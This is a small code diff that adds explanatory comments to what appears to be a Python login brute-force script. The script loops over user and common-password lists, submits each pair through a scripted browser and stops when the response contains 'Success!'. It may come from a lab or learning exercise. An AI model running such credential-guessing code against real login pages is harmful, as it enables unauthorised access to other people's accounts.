@@ -10,6 +10,7 @@ pp=["password","1234","qwerty","admin"]
 i=0
 j=0
 
+#do everything while we did not succeed
 while siker!=1:  
   for i in range(len(pu)):
     for j in range(len(pp)):
@@ -73,7 +74,11 @@ while siker!=1:
 
       #read the response
       soup=BeautifulSoup(br.response().read(),"html.parser")
+      
+      #convert the response to string
       s=str(soup)
+
+      #if we found the string 'Success', we break
       if (s.find("Success!")>0):
         siker=1
         u=pu[i]
